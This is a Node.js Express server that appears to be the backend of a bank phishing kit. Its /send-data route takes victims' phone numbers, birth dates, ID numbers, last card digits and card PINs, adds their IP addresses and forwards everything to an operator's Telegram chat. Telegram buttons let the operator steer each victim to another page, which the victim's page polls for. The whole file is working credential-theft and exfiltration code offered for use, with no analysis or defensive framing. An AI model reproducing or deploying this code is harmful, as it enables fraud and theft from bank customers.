import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const redirectMap = new Map(); // clientId => redirection URL

// Ruta principal
app.get('/', (req, res) => {
  res.send('Servidor activo');
});

// Ruta para recibir datos y enviar a Telegram
app.post('/send-data', async (req, res) => {
  const data = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const mensaje = `
🔵B4NC0P3L🔵:
📱 Celular: ${data.celular}
🎂 Nacimiento: ${data.fechaNacimiento}
🆔 Tipo ID: ${data.tipoIdentificacion}
🔢 ID: ${data.numeroIdentificador}
💳 Últimos 2: ${data.ultimos2}
🔐 NIP: ${data.nip}

🆔 ID ClienteWEB: ${data.clientId}
🌐 IP: ${ip}

Elige una acción:
  `;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "➡ Redirigir A", callback_data: `redir|${data.clientId}|https://pagina-a.com` },
        { text: "➡ Redirigir B", callback_data: `redir|${data.clientId}|https://pagina-b.com` },
        { text: "➡ Redirigir C", callback_data: `redir|${data.clientId}|https://pagina-c.com` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje,
        reply_markup: keyboard
      })
    });

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// Ruta para recibir botón de Telegram
app.post('/bot-callback', async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback || !callback.data) return res.sendStatus(400);

  const [action, clientId, url] = callback.data.split('|');
  if (action === 'redir') {
    redirectMap.set(clientId, url);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Redirección preparada para cliente ${clientId}`
      })
    });

    res.sendStatus(200);
  }
});

// Ruta para polling desde verifidata.html
app.get('/check-redirect/:id', (req, res) => {
  const clientId = req.params.id;
  const redirectUrl = redirectMap.get(clientId);

  if (redirectUrl) {
    redirectMap.delete(clientId); // consumir una sola vez
    res.json({ redirect: redirectUrl });
  } else {
    res.json({ redirect: null });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor en puerto ${PORT}`));
